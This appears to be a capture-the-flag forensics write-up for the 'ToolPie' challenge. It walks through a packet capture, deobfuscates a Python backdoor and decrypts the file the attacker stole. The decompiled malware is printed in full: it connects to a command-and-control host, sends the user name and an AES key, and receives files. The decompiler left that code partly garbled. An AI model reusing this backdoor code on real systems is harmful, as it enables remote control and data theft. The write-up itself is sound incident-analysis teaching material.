---
layout: load_md
title: The White Circle | Cyber Apocalypse 2025 | ToolPie Writeup
desc: "The White Circle is a community for Cyber/Information Security students, enthusiasts and professionals. You can discuss anything related to Security, share your knowledge with others, get help when you need it and proceed further in your journey with amazing people from all over the world."
image: images/twc_og_banner.jpg
ctf: Cyber Apocalypse 2025
parent: cyber_apocalypse_2025
category: forensics
challenge: ToolPie
tags: "forensics, twh, pcap, wireshark, tshark, python, obfuscation, aes"
date: 2025-03-29T00:00:00+00:00
last_update: 2025-03-29T00:00:00+00:00
---

<h1 class="heading card-title white-text">Cyber Apocalypse 2025</h1>


## ToolPie
> Solved by thewhiteh4t


- We were given a PCAP in this challenge


1. What is the IP address responsible for compromising the website?
    1. based on POST requests in the PCAP : `194.59.6.66`
2. What is the name of the endpoint exploited by the attacker?
    1. based on POST requests : `/execute`
3. What is the name of the obfuscation tool used by the attacker?
    1. simply printing the script found above shows a code object which contains a string : `Py-Fuscate`

```    
    # replaced exec() with print()
    > python chal.py
    <code object <module> at 0x555555605650, file "Py-Fuscate", line 1>
```

4. What is the IP address and port used by the malware to establish a connection with the Command and Control (C2) server?
    1. To find this first we need to get the plain text code, what we have is a `python code object`, we can create `pyc` file which is bytecode and get plaintext from it using tools like `uncompyle6`, `decompyle3` or `pycdc`
    2. However none of the tools worked due to python version mismatch, so I found `pylingual`
    3. in the code we can see the ip and port : `13.61.7.218:55155`

```
    # Decompiled with PyLingual (https://pylingual.io)
    # Internal filename: Py-Fuscate
    # Bytecode version: 3.13.0rc3 (3571)
    # Source timestamp: 2025-03-24 20:26:54 UTC (1742848014)
    from os import popen
    pass
    pass
    import socket
    import threading
    import os
    import time
    import random
    import string
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    user = os.popen('whoami').read()
    BUFFER_SIZE = 4096
    SEPARATOR = '<SEPARATOR>'
    CONN = True
    def enc_mes(mes, key):
        try:
            cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
            cypher_block = 16
            mes = mes.encode() if type(mes)!= bytes else mes
            return cypher.encrypt(pad(mes, cypher_block))
        except:
            return None
    def dec_file_mes(mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        cypher_block = 16
        s = cypher.decrypt(mes)
        return unpad(s, cypher_block)
    def dec_mes(mes, key):
        if mes == b'':
            return mes
    def receive_file():
        try:
            client2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client2.connect(('13.61.7.218', 54163))
            k = ''.join((random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16)))
            client2.send(k.encode())
            pass
            enc_received = client2.recv(BUFFER_SIZE)
            received = dec_mes(enc_received, k).decode()
            filename, filesize = received.split(SEPARATOR)
            ok_enc = enc_mes('ok2', k)
            client2.send(ok_enc)
            total_bytes = 0
            msg = b''
            if total_bytes < int(filesize):
                bytes_read = client2.recv(BUFFER_SIZE)
                msg += bytes_read
                total_bytes += len(bytes_read)
            decr_file = dec_mes(msg, k)
            with open(filename, 'wb') as f:
                f.write(decr_file)
                    pass
                    client2.close()
        except:
            pass  # postinserted
        client2.send('Error transporting file'.encode())
    def receive(client, k):
        pass
        try:
            pass  # postinserted
        s += 1
        msg = client.recv(1024)
        raise Exception('Reconnect!') if s == 300 else True if msg == b'' else False
        except:
            pass  # postinserted
        pass
        try:
            pass  # postinserted
        client.close()
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('13.61.7.218', 55155))
        k = ''.join((random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16)))
        client.send(f'{user}{SEPARATOR}{k}'.encode())
        client.settimeout(600)
        time.sleep(60)
        except:
            time.sleep(60)
    if __name__ == '__main__':
        pass
        try:
            pass  # postinserted
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect(('13.61.7.218', 55155))
        k = ''.join((random.SystemRandom().choice(string.ascii_letters + string.digits) for _ in range(16)))
        client.send(f'{user}{SEPARATOR}{k}'.encode())
        client.settimeout(600)
        break
        receive_thread = threading.Thread(target=receive, args=(client, k))
        receive_thread.start()
    except:
        pass  # postinserted
    time.sleep(50)
```

5. What encryption key did the attacker use to secure the data?
    1. in the code we can see where the key is sent : `client.send(f'{user}{SEPARATOR}{k}'.encode())`
    2. we can look for this pattern in the PCAP : `ec2amaz-bktvi3e\administrator\n5UUfizsRsP7oOCAq` so the key is : `5UUfizsRsP7oOCAq`


6. What is the MD5 hash of the file exfiltrated by the attacker?
    1. since we have the key, we can write our own decryption script
    2. first we need to extract data chunks from the PCAP using `tshark -2 -r capture.pcap -R "tcp.stream eq 4 and data.data" -T fields -e data.data > datafile.txt`
    3. now we can write a script to parse data chunks and decrypt the stolen files

```
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    
    def dec_file_mes(mes, key):
        cypher = AES.new(key.encode(), AES.MODE_CBC, key.encode())
        cypher_block = 16
        s = cypher.decrypt(mes)
        return unpad(s, cypher_block)
    
    key = '5UUfizsRsP7oOCAq'
    
    filename = None
    size = 0
    container = b''
    filling = False
    got_size = False
    
    with open('datafile.txt') as encfile:
        hex_lines = encfile.readlines()
        for line in hex_lines:
            got_name = False
            if filename:
                got_name = True
    
            msg = bytes.fromhex(line)
            if b'SEPARATOR' in msg:
                continue
    
            if not filling:
                decr_file = dec_file_mes(msg, key)
                if b'C:' in decr_file:
                    filename = decr_file.decode().split('\\')[-1]
                    print('[+] Filename : ', filename)
                if got_name and not got_size:
                    if int(decr_file.decode()):
                        size = int(decr_file.decode())
                        print('[+] File Size : ', size)
                        got_size = True
                if size and b'ok' in decr_file:  # handle last ok msg after size
                    filling = True
            else:
                if len(container) != size:
                    container += msg
    
        decr_file = dec_file_mes(container, key)
        print(f'[+] Writing : {filename}')
        with open(filename, 'wb') as outfile:
            outfile.write(decr_file)
```    


![](https://i.imgur.com/8nMLOhx.png)


MD5 Hash : `8fde053c8e79cf7e03599d559f90b321`


